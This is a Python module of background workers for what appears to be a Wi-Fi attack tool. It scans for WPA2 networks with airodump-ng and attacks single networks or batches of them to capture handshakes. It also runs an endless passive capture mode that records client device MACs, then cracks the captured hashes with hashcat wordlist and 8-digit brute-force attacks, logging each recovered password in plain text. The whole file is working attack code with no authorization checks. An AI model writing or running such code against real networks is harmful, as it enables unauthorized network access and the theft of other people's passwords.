"""
Background worker functions.

Contains all long-running operations that run in separate threads:
scanning, attacking, cracking.
"""

from __future__ import annotations
import os
import time
import subprocess
import builtins
import glob
from datetime import datetime
from typing import List, Dict, Any, Optional

from .state import get_state
from .storage import get_storage
from .services import HashService, NetworkService
from .logging import log, get_logger

# Import core sniff functionality
import memento as sniff
import cracking


def cleanup_orphan_captures(essid: str, bssid: str) -> int:
    """
    Clean up capture files that don't have corresponding hash files.
    Called when no handshake is extracted from a capture.
    
    Returns number of files deleted.
    """
    deleted = 0
    # Look for capture files matching this network
    safe_essid = essid.replace(' ', '_')  # Match the sanitization in sniff.py
    patterns = [
        f"captures/*{safe_essid}*.cap",
        f"captures/*{safe_essid}*.pcap",
        f"capture_{safe_essid}*.cap",  # Files in working dir before move
        f"capture_{safe_essid}*.csv",
        f"capture_{safe_essid}*.log",
    ]
    
    for pattern in patterns:
        for cap_file in glob.glob(pattern):
            try:
                os.remove(cap_file)
                deleted += 1
            except Exception:
                pass
    
    return deleted

def run_scan_worker() -> None:
    """Background worker for network scanning."""
    state = get_state()
    storage = get_storage()
    
    sniff.graceful_shutdown = False
    state.scanning = True
    storage.update_stats(
        scan_start_time=datetime.now().isoformat(),
        current_operation='Scanning for networks...',
    )
    
    csv_file = None
    scan_proc = None
    
    log('Starting network scan...', 'info')
    log(f'Band: {state.settings["band"]}', 'info')
    
    def publish_networks(parsed_networks, elapsed=None):
        """Update state with parsed networks."""
        if not parsed_networks:
            storage.mark_all_cached(set())
            storage.update_stats(networks_scanned=0)
            return
        
        station_counts = sniff.get_station_counts(csv_file) if csv_file and os.path.exists(csv_file) else {}
        stations_by_bssid = sniff.get_all_stations_by_bssid(csv_file) if csv_file and os.path.exists(csv_file) else {}
        
        payload = []
        for net in parsed_networks:
            bssid_upper = net['bssid'].upper()
            stations = stations_by_bssid.get(bssid_upper, [])
            
            payload.append({
                'bssid': net['bssid'],
                'essid': net['essid'],
                'channel': net['channel'],
                'power': net.get('power', '-50'),
                'encryption': 'WPA2-PSK',
                'has_clients': len(stations) > 0,
                'clients': len(stations),
                'stations': stations,
            })
        
        state.merge_scan_results(payload)
        storage.update_stats(networks_scanned=len(payload))
        
        if elapsed is not None:
            log(f'Found {len(payload)} networks ({elapsed}s elapsed)...', 'info')
        else:
            log(f'Found {len(payload)} networks total', 'info')
    
    try:
        sniff.BAND = state.settings['band']
        
        # Get or detect interface
        if state.settings['interface']:
            interface = state.settings['interface']
            log(f'Using configured interface: {interface}', 'info')
        else:
            log('Auto-detecting wireless interface...', 'info')
            interfaces = sniff.get_all_wireless_interfaces()
            if not interfaces:
                raise Exception("No wireless interface found")
            interface = interfaces[0]
            storage.update_settings(interface=interface)
            if len(interfaces) > 1:
                log(f'Multiple interfaces found, using {interface}', 'warning')
        
        log(f'Using interface: {interface}', 'info')
        
        # Start monitor mode
        log('Starting monitor mode...', 'info')
        log('Stopping NetworkManager and wpa_supplicant...', 'info')
        mon_interface = sniff.start_monitor_mode(interface)
        state.monitor_interface = mon_interface
        log(f'Monitor mode enabled: {mon_interface}', 'success')
        
        # Scan
        scan_duration = 120
        log(f'Scanning for {scan_duration}s to detect networks and clients...', 'info')
        
        csv_file, scan_proc = sniff.scan_networks(mon_interface, duration=scan_duration, background=True)
        
        if not csv_file:
            log('Failed to start scan', 'error')
            return
        
        scan_start = time.time()
        last_update = 0
        
        while time.time() - scan_start < scan_duration:
            if not state.scanning:
                log('Scan stopped by user', 'warning')
                if scan_proc:
                    sniff.terminate_process(scan_proc, name='airodump-ng scan', force=True)
                    scan_proc = None
                subprocess.run("pkill -9 airodump-ng", shell=True, stderr=subprocess.DEVNULL)
                break
            
            elapsed = int(time.time() - scan_start)
            
            if elapsed - last_update >= 15:
                last_update = elapsed
                if os.path.exists(csv_file):
                    networks = sniff.parse_networks(csv_file)
                    publish_networks(networks, elapsed=elapsed)
            
            time.sleep(1)
        
        if scan_proc:
            sniff.terminate_process(scan_proc, name='airodump-ng scan')
            scan_proc = None
        
        if csv_file and os.path.exists(csv_file):
            log('Parsing discovered networks...', 'info')
            networks = sniff.parse_networks(csv_file)
            publish_networks(networks)
            log(f'Scan complete: {len(networks)} PSK networks total', 'success')
        
    except Exception as e:
        log(f'Scan error: {str(e)}', 'error')
        import traceback
        traceback.print_exc()
    finally:
        if scan_proc:
            sniff.terminate_process(scan_proc, name='airodump-ng scan', force=True)
        state.scanning = False
        storage.update_stats(current_operation='Idle')
        storage.flush()


def run_attack_worker(network: Dict[str, Any]) -> None:
    """Background worker for attacking a single network."""
    state = get_state()
    storage = get_storage()
    
    sniff.graceful_shutdown = False
    state.attacking = True
    state.current_network = network
    storage.update_stats(current_operation=f'Attacking {network["essid"]}...')
    
    log(f'Targeting {network["essid"]} ({network["bssid"]}) on channel {network["channel"]}', 'info')
    
    try:
        if not state.attacking:
            log('Attack cancelled before start', 'warning')
            return
        
        # Ensure monitor mode
        if not state.monitor_interface:
            log('Monitor interface not active, starting monitor mode...', 'warning')
            
            interface = state.settings.get('interface')
            if not interface:
                interfaces = sniff.get_all_wireless_interfaces()
                if not interfaces:
                    log('No wireless interface found', 'error')
                    return
                interface = interfaces[0]
                storage.update_settings(interface=interface)
            
            log('Starting monitor mode...', 'info')
            mon_interface = sniff.start_monitor_mode(interface)
            state.monitor_interface = mon_interface
            log(f'Monitor mode enabled: {mon_interface}', 'success')
        
        target_net = {
            'bssid': network['bssid'],
            'essid': network['essid'],
            'channel': network['channel'],
            'power': network.get('power', '-50'),
            'encryption': network.get('encryption', 'WPA2-PSK'),
            'clients': network.get('clients', 0),
            'has_clients': network.get('has_clients', False),
            'stations': network.get('stations', []),
        }
        
        before_count = len(sniff.captured_handshakes)
        
        log('Starting handshake capture...', 'info')
        
        # Redirect prints to log
        def log_print(*args, **kwargs):
            message = ' '.join(str(arg) for arg in args)
            level = 'info'
            if '[+]' in message:
                level = 'success'
            elif '[!]' in message:
                level = 'warning'
            message = message.replace('[+]', '').replace('[!]', '').replace('[*]', '').strip()
            log(message, level)
        
        old_print = builtins.print
        builtins.print = log_print
        
        try:
            updated_info = sniff.capture_handshake(state.monitor_interface, target_net)
            
            if updated_info and updated_info.get('bssid'):
                stations = [mac.upper() for mac in updated_info.get('stations', [])]
                storage.upsert_network(
                    updated_info['bssid'],
                    essid=updated_info.get('essid'),
                    channel=updated_info.get('channel'),
                    power=updated_info.get('power'),
                    encryption=updated_info.get('encryption'),
                    stations=stations,
                    cached=False,
                )
                log(f'Network info refreshed: {updated_info.get("clients", 0)} clients, {updated_info.get("power", "-50")} dBm', 'info')
        finally:
            builtins.print = old_print
        
        after_count = len(sniff.captured_handshakes)
        if after_count > before_count:
            storage.increment_stat('handshakes_captured')
            log('Handshake captured successfully!', 'success')
            HashService.sync_inventory()
        else:
            log('No handshake detected', 'warning')
            # Clean up orphan capture files
            deleted = cleanup_orphan_captures(network.get('essid', ''), network.get('bssid', ''))
            if deleted > 0:
                log(f'Cleaned up {deleted} orphan capture file(s)', 'info')
        
        storage.increment_stat('networks_attacked')
        
    except Exception as e:
        log(f'Attack error: {str(e)}', 'error')
        import traceback
        traceback.print_exc()
    finally:
        state.attacking = False
        state.current_network = None
        storage.update_stats(current_operation='Idle')
        storage.flush()


def run_batch_attack_worker(network_list: List[Dict[str, Any]]) -> None:
    """Background worker for batch attacking multiple networks."""
    state = get_state()
    storage = get_storage()
    
    sniff.graceful_shutdown = False
    state.attacking = True
    total = len(network_list)
    
    for i, network in enumerate(network_list, 1):
        if not state.attacking:
            log(f'Batch attack cancelled. Processed {i-1}/{total} networks.', 'warning')
            break
        
        state.current_network = network
        storage.update_stats(current_operation=f'Batch [{i}/{total}]: {network["essid"]}')
        
        log(f'[{i}/{total}] Attacking {network["essid"]} ({network["bssid"]})...', 'info')
        
        try:
            # Ensure monitor mode
            if not state.monitor_interface:
                log('Monitor interface not active, starting monitor mode...', 'warning')
                
                interface = state.settings.get('interface')
                if not interface:
                    interfaces = sniff.get_all_wireless_interfaces()
                    if not interfaces:
                        log('No wireless interface found', 'error')
                        break
                    interface = interfaces[0]
                
                mon_interface = sniff.start_monitor_mode(interface)
                state.monitor_interface = mon_interface
                log(f'Monitor mode enabled: {mon_interface}', 'success')
            
            target_net = {
                'bssid': network['bssid'],
                'essid': network['essid'],
                'channel': network['channel'],
                'power': network.get('power', '-50'),
                'encryption': network.get('encryption', 'WPA2-PSK'),
                'clients': network.get('clients', 0),
                'has_clients': network.get('has_clients', False),
                'stations': network.get('stations', []),
            }
            
            before_count = len(sniff.captured_handshakes)
            
            def log_print(*args, **kwargs):
                message = ' '.join(str(arg) for arg in args)
                level = 'info'
                if '[+]' in message:
                    level = 'success'
                elif '[!]' in message:
                    level = 'warning'
                message = message.replace('[+]', '').replace('[!]', '').replace('[*]', '').strip()
                log(message, level)
            
            old_print = builtins.print
            builtins.print = log_print
            
            try:
                updated_info = sniff.capture_handshake(state.monitor_interface, target_net)
                
                if updated_info and updated_info.get('bssid'):
                    stations = [mac.upper() for mac in updated_info.get('stations', [])]
                    storage.upsert_network(
                        updated_info['bssid'],
                        essid=updated_info.get('essid'),
                        channel=updated_info.get('channel'),
                        power=updated_info.get('power'),
                        encryption=updated_info.get('encryption'),
                        stations=stations,
                        cached=False,
                    )
                
                after_count = len(sniff.captured_handshakes)
                if after_count > before_count:
                    storage.increment_stat('handshakes_captured')
                    log(f'[{i}/{total}] Handshake captured for {network["essid"]}!', 'success')
                    HashService.sync_inventory()
                else:
                    log(f'[{i}/{total}] No handshake for {network["essid"]}', 'warning')
            finally:
                builtins.print = old_print
            
            storage.increment_stat('networks_attacked')
            
        except Exception as e:
            log(f'[{i}/{total}] Attack error: {str(e)}', 'error')
            import traceback
            traceback.print_exc()
    
    state.attacking = False
    state.current_network = None
    storage.update_stats(current_operation='Idle')
    storage.flush()
    log(f'Batch attack completed. Processed {total} network(s).', 'success')


def run_crack_worker(task_list: List[Dict[str, Any]]) -> None:
    """Background worker for cracking hash files."""
    if not task_list:
        return
    
    state = get_state()
    storage = get_storage()
    
    state.cracking = True
    state.crack_queue = task_list
    total = len(task_list)
    
    def update_operation(message: str):
        if not state.scanning and not state.attacking:
            storage.update_stats(current_operation=message)
    
    try:
        for idx, task in enumerate(task_list, 1):
            if not state.cracking:
                log('Cracking cancelled by user request', 'warning')
                break
            
            state.current_crack = task
            hash_name = task["hash_name"]
            mask_type = task.get('mask_type')
            
            # Determine attack type
            if mask_type:
                # Mask attack (e.g., 8-digit numbers)
                update_operation(f'Cracking [{idx}/{total}] {hash_name} (mask)')
                mask_desc = '8-digit numbers' if mask_type == '__MASK_8DIGIT__' else mask_type
                log(f'[{idx}/{total}] Cracking {hash_name} with {mask_desc}...', 'info')
                
                def forward_log(message: str, prefix=hash_name):
                    log(f'{prefix}: {message}', 'info')
                
                try:
                    # Check if this mask was already tried
                    if storage.has_attempted(task['hash_rel'], mask_type, None):
                        log(f'[{idx}/{total}] Skipping duplicate mask attempt ({mask_desc})', 'info')
                        continue
                    
                    result = cracking.run_mask_attack(
                        task['hash'],
                        mask_type,
                        log_callback=forward_log,
                    )
                    
                    if result.get('cracked'):
                        storage.increment_stat('hashes_cracked')
                        HashService.mark_cracked(task.get('hash'), result.get('output_file'))
                        log(f'[{idx}/{total}] Case solved! Evidence saved to {result.get("output_file")}', 'success')
                    else:
                        exit_code = result.get('exit_code')
                        log(f'[{idx}/{total}] No matches (exit {exit_code})', 'warning')
                        
                        # Exit code 1 means exhausted - record attempt
                        if exit_code == 1:
                            if storage.add_cracking_attempt(task['hash_rel'], mask_type, None):
                                log(f'[{idx}/{total}] Recorded mask attempt: {mask_desc}', 'info')
                        
                except Exception as e:
                    log(f'[{idx}/{total}] Mask attack error: {e}', 'error')
                    import traceback
                    traceback.print_exc()
            else:
                # Regular wordlist attack
                update_operation(f'Cracking [{idx}/{total}] {hash_name}')
                log(f'[{idx}/{total}] Cracking {hash_name} with {task["wordlist_name"]}...', 'info')
                
                def forward_log(message: str, prefix=hash_name):
                    log(f'{prefix}: {message}', 'info')
                
                try:
                    # Extract rule file if provided
                    rule_file = task.get('rule_file')
                    wordlist_name = task.get('wordlist_name', os.path.basename(task['wordlist']))
                    rule_name = os.path.basename(rule_file) if rule_file else None
                    
                    # Check if this wordlist+rule combo was already tried
                    if storage.has_attempted(task['hash_rel'], wordlist_name, rule_name):
                        log(f'[{idx}/{total}] Skipping duplicate attempt ({wordlist_name} + {rule_name or "no rule"})', 'info')
                        continue
                    
                    result = cracking.run_cracker(
                        task['hash'],
                        task['wordlist'],
                        rule_file=rule_file,
                        log_callback=forward_log,
                    )
                    
                    if result.get('cracked'):
                        storage.increment_stat('hashes_cracked')
                        HashService.mark_cracked(task.get('hash'), result.get('output_file'))
                        log(f'[{idx}/{total}] Case solved! Evidence saved to {result.get("output_file")}', 'success')
                    else:
                        exit_code = result.get('exit_code')
                        log(f'[{idx}/{total}] No matches (exit {exit_code})', 'warning')
                        
                        # Exit code 1 means all passwords exhausted - record the attempt
                        if exit_code == 1:
                            if storage.add_cracking_attempt(task['hash_rel'], wordlist_name, rule_name):
                                log(f'[{idx}/{total}] Recorded attempt: {wordlist_name}' + (f' + {rule_name}' if rule_name else ''), 'info')
                        
                except Exception as e:
                    log(f'[{idx}/{total}] Cracking error: {e}', 'error')
                    import traceback
                    traceback.print_exc()
        
        log('Cracking queue finished.', 'success')
        
    finally:
        state.cracking = False
        state.current_crack = None
        state.crack_queue = []
        if not state.scanning and not state.attacking and not state.vigilant:
            storage.update_stats(current_operation='Idle')
        storage.flush()


def run_vigilance_worker() -> None:
    """
    Vigilance Mode: Constant passive scanning.
    
    Listens continuously for handshakes without active deauth.
    - Updates networks and clients in real-time
    - Extracts valid handshakes using hcxpcapngtool
    - Auto-cleans garbage captures (no valid handshakes)
    - Runs indefinitely until stopped by user
    """
    state = get_state()
    storage = get_storage()
    
    sniff.graceful_shutdown = False
    state.vigilant = True
    storage.update_stats(
        scan_start_time=datetime.now().isoformat(),
        current_operation='Vigilance: Watching...',
    )
    
    log('Vigilance Mode activated - Watching the airwaves...', 'success')
    log('Passive handshake capture enabled. No active attacks.', 'info')
    
    csv_file = None
    capture_proc = None
    cycle_count = 0
    
    try:
        # Ensure monitor mode
        interface = state.settings.get('interface') or sniff.get_wireless_interface(auto_select=True)
        if not state.monitor_interface:
            log(f'Enabling monitor mode on {interface}...', 'info')
            mon_interface = sniff.start_monitor_mode(interface)
            state.monitor_interface = mon_interface
            log(f'Monitor mode enabled: {mon_interface}', 'success')
        else:
            mon_interface = state.monitor_interface
            log(f'Using existing monitor interface: {mon_interface}', 'info')
        
        band = state.settings.get('band', 'abg')
        sniff.BAND = band
        
        # Continuous loop
        while state.vigilant:
            cycle_count += 1
            cycle_start = time.time()
            
            # Create capture file for this cycle
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_prefix = f"vigilance_{timestamp}"
            cap_log = f"{capture_prefix}.log"
            
            storage.update_stats(current_operation=f'Vigilance: Cycle {cycle_count}')
            log(f'Cycle {cycle_count}: Starting 60s passive capture...', 'info')
            
            # Ensure channel hopping is enabled before each cycle
            sniff.ensure_channel_hopping(mon_interface)
            
            # Start airodump-ng in passive mode (no deauth)
            cmd = f"airodump-ng {mon_interface} --band {band} -w {capture_prefix} --output-format csv,pcap 2>{cap_log}"
            capture_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
            sniff.active_processes.append(capture_proc)
            
            # Monitor for 60 seconds
            cycle_duration = 60
            last_network_update = 0
            
            for elapsed in range(cycle_duration):
                if not state.vigilant:
                    log('Vigilance mode stopping...', 'warning')
                    break
                
                # Update networks every 15 seconds
                if elapsed - last_network_update >= 15:
                    last_network_update = elapsed
                    csv_candidates = [f"{capture_prefix}-01.csv", f"{capture_prefix}.csv"]
                    for csv_candidate in csv_candidates:
                        if os.path.exists(csv_candidate):
                            csv_file = csv_candidate
                            networks = sniff.parse_networks(csv_file)
                            if networks:
                                # Get station data
                                stations_map = sniff.get_all_stations_by_bssid(csv_file)
                                
                                # Merge into storage
                                active_bssids = set()
                                with storage.batch_update():
                                    for net in networks:
                                        bssid = net.get('bssid', '').upper()
                                        if not bssid:
                                            continue
                                        active_bssids.add(bssid)
                                        
                                        stations = stations_map.get(bssid, [])
                                        storage.upsert_network(
                                            bssid,
                                            essid=net.get('essid'),
                                            channel=net.get('channel'),
                                            power=net.get('power'),
                                            encryption=net.get('encryption', 'WPA2-PSK'),
                                            stations=stations,
                                            clients=len(stations),
                                            has_clients=len(stations) > 0,
                                            cached=False,
                                            last_seen=datetime.now().isoformat(),
                                        )
                                        
                                        for mac in stations:
                                            storage.upsert_device(mac.upper(), bssid)
                                
                                storage.update_stats(networks_scanned=len(networks))
                            break
                
                time.sleep(1)
            
            # Stop capture
            if capture_proc:
                sniff.terminate_process(capture_proc, name='vigilance capture')
                capture_proc = None
            
            if not state.vigilant:
                break
            
            # Check for handshakes in the captured data
            cap_file = f"{capture_prefix}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 1000:
                log(f'Analyzing capture for handshakes...', 'info')
                
                # Try to extract handshakes with hcxpcapngtool
                hash_file = f"hashes/vigilance_{timestamp}.hc22000"
                try:
                    result = subprocess.run(
                        f"hcxpcapngtool -o {hash_file} {cap_file} 2>&1",
                        shell=True, capture_output=True, text=True, timeout=30
                    )
                    
                    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                        hash_size = os.path.getsize(hash_file)
                        log(f'HANDSHAKE CAPTURED! {hash_file} ({hash_size} bytes)', 'success')
                        storage.increment_stat('handshakes_captured')
                        
                        # Move capture to captures folder
                        new_cap_path = f"captures/{os.path.basename(cap_file)}"
                        try:
                            os.rename(cap_file, new_cap_path)
                        except:
                            pass
                        
                        # Sync hash inventory
                        HashService.sync_inventory()
                    else:
                        # No valid handshake - clean up garbage
                        log(f'No handshakes in cycle {cycle_count}, cleaning up...', 'info')
                        
                except subprocess.TimeoutExpired:
                    log('Handshake analysis timed out', 'warning')
                except Exception as e:
                    log(f'Handshake analysis error: {e}', 'error')
            
            # Clean up cycle files (garbage collection)
            cleanup_patterns = [
                f"{capture_prefix}-*",
                f"{capture_prefix}.*"
            ]
            for pattern in cleanup_patterns:
                result = subprocess.run(f"ls {pattern} 2>/dev/null", shell=True, capture_output=True, text=True)
                for f in result.stdout.split():
                    if f and os.path.exists(f) and 'hc22000' not in f:
                        try:
                            os.remove(f)
                        except:
                            pass
            
            storage.flush()
            
            # Brief pause between cycles
            if state.vigilant:
                time.sleep(2)
        
    except Exception as e:
        log(f'Vigilance error: {str(e)}', 'error')
        import traceback
        traceback.print_exc()
    finally:
        if capture_proc:
            sniff.terminate_process(capture_proc, name='vigilance capture', force=True)
        subprocess.run("pkill -9 airodump-ng", shell=True, stderr=subprocess.DEVNULL)
        state.vigilant = False
        storage.update_stats(current_operation='Idle')
        storage.flush()
        log('Vigilance Mode deactivated', 'info')


def run_rolling_cracker_worker() -> None:
    """
    Rolling Cracker: Continuous background hash cracking.
    
    Iterates through uncracked hashes, trying each wordlist.
    - Uses user-specified wordlist order if provided
    - Skips already-attempted combinations
    - Can run alongside Vigilance mode
    - Rules are currently disabled (AI passwords only)
    """
    from .rolling_cracker import RollingCracker
    
    state = get_state()
    storage = get_storage()
    
    state.rolling_cracking = True
    storage.update_stats(current_operation='Anterograde Amnesia...')
    
    log('Anterograde Amnesia activated - solving cases in a loop...', 'success')
    
    try:
        cracker = RollingCracker()
        
        # Get available wordlists
        wordlists = storage.stats.get('wordlists', [])
        if not wordlists:
            # Fallback: scan wordlists directory
            wl_dir = 'wordlists'
            if os.path.exists(wl_dir):
                wordlists = [
                    {'path': os.path.join(wl_dir, f), 'name': f}
                    for f in os.listdir(wl_dir)
                    if f.endswith('.txt')
                ]
        
        # Add virtual wordlists (mask attacks treated as wordlists)
        virtual_wordlists = [
            {'path': '__MASK_8DIGIT__', 'name': '8-digit numbers (bruteforce)'},
        ]
        wordlists = virtual_wordlists + wordlists
        
        # Apply user-specified wordlist order if provided
        if state.wordlist_order:
            order_map = {name: idx for idx, name in enumerate(state.wordlist_order)}
            # Sort wordlists by user order, unordered ones go to the end
            wordlists.sort(key=lambda w: order_map.get(w.get('name', ''), 999))
            log(f'Using custom wordlist order ({len(state.wordlist_order)} items)', 'info')
        
        # Rules are disabled - using AI-generated passwords only
        rules = []
        
        jobs_completed = 0
        
        while state.rolling_cracking:
            # Get next job
            job = cracker.process_next(wordlists, rules)
            
            if not job:
                log('All combinations exhausted, waiting for new hashes...', 'info')
                # Wait and check again
                for _ in range(30):  # 30 seconds
                    if not state.rolling_cracking:
                        break
                    time.sleep(1)
                continue
            
            hash_record = job['hash']
            essid = hash_record.get('essid', 'Unknown')
            hash_path = hash_record.get('path', '')
            
            log(f'Cracking {essid}: {job["description"]}', 'info')
            storage.update_stats(current_operation=f'Solving: {essid}')
            
            # Generate output file path for cracked password
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"cracked/{essid}_{timestamp}_rolling.cracked"
            os.makedirs('cracked', exist_ok=True)
            
            # Build hashcat command with --outfile to capture password
            wordlist_path = job['wordlist_path']
            is_mask_attack = wordlist_path.startswith('__MASK_')
            
            # Map virtual wordlist to mask pattern
            mask_patterns = {
                '__MASK_8DIGIT__': '?d?d?d?d?d?d?d?d',
            }
            
            if is_mask_attack:
                # Mask attack (brute-force)
                mask = mask_patterns.get(wordlist_path, '?d?d?d?d?d?d?d?d')
                cmd = [
                    'hashcat',
                    '-m', '22000',
                    '-a', '3',  # Mask/brute-force mode
                    hash_path,
                    mask,
                    '--potfile-disable',
                    '-O',
                    '--outfile', output_file,
                    '--outfile-format', '2',  # Plain password only
                ]
            else:
                # Regular wordlist attack
                cmd = [
                    'hashcat',
                    '-m', '22000',
                    '-a', '0',  # Wordlist mode
                    hash_path,
                    wordlist_path,
                    '--potfile-disable',
                    '-O',
                    '--outfile', output_file,
                    '--outfile-format', '2',  # Plain password only
                ]
            
            if job['rule_path']:
                cmd.extend(['-r', job['rule_path']])
            
            # Run hashcat with progress monitoring (no timeout)
            try:
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,  # Line buffered
                )
                
                last_progress_time = time.time()
                last_progress_line = ""
                
                # Monitor process output
                while proc.poll() is None:
                    # Check if user stopped
                    if not state.rolling_cracking:
                        log(f'{essid}: User cancelled, terminating...', 'warning')
                        proc.terminate()
                        try:
                            proc.wait(timeout=5)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                        break
                    
                    # Read available output (non-blocking via select)
                    import select
                    readable, _, _ = select.select([proc.stdout], [], [], 0.5)
                    if readable:
                        line = proc.stdout.readline()
                        if line:
                            # Capture progress lines for status updates
                            if 'Progress' in line or 'Speed' in line or 'Recovered' in line:
                                last_progress_line = line.strip()
                    
                    # Log progress every 15 minutes
                    elapsed = time.time() - last_progress_time
                    if elapsed >= 900:  # 15 minutes
                        if last_progress_line:
                            log(f'{essid}: {last_progress_line}', 'info')
                        else:
                            log(f'{essid}: Still running...', 'info')
                        last_progress_time = time.time()
                
                # Get final exit code
                exit_code = proc.returncode if proc.returncode is not None else proc.wait()
                
                # Record attempt - for virtual wordlists, use the path as identifier
                if is_mask_attack:
                    wordlist_name = wordlist_path  # e.g., '__MASK_8DIGIT__'
                else:
                    wordlist_name = os.path.basename(wordlist_path)
                rule_name = os.path.basename(job['rule_path']) if job['rule_path'] else ''
                storage.add_cracking_attempt(hash_path, wordlist_name, rule_name)
                
                if exit_code == 0:
                    # Cracked! Check output file for password
                    log(f'CRACKED {essid}!', 'success')
                    storage.increment_stat('hashes_cracked')
                    
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        HashService.mark_cracked(hash_path, output_file)
                        # Read password for logging (first line only)
                        try:
                            with open(output_file, 'r') as f:
                                password = f.readline().strip()
                            log(f'Password: {password}', 'success')
                        except:
                            pass
                    else:
                        log(f'Warning: Output file empty for {essid}', 'warning')
                        HashService.mark_cracked(hash_path, None)
                else:
                    log(f'{essid}: no match with {job["description"]}', 'info')
                
                jobs_completed += 1
                
            except Exception as e:
                log(f'Error: {e}', 'error')
            
            # Clean up ESSID wordlist if generated
            if job.get('essid_wordlist') and os.path.exists(job['essid_wordlist']):
                try:
                    os.remove(job['essid_wordlist'])
                except:
                    pass
            
            storage.flush()
            
            # Brief pause between jobs
            if state.rolling_cracking:
                time.sleep(2)
        
        log(f'Anterograde Amnesia stopped ({jobs_completed} jobs completed)', 'info')
        
    except Exception as e:
        log(f'Rolling Cracker error: {str(e)}', 'error')
        import traceback
        traceback.print_exc()
    finally:
        state.rolling_cracking = False
        if not state.scanning and not state.attacking and not state.vigilant:
            storage.update_stats(current_operation='Idle')
        storage.flush()

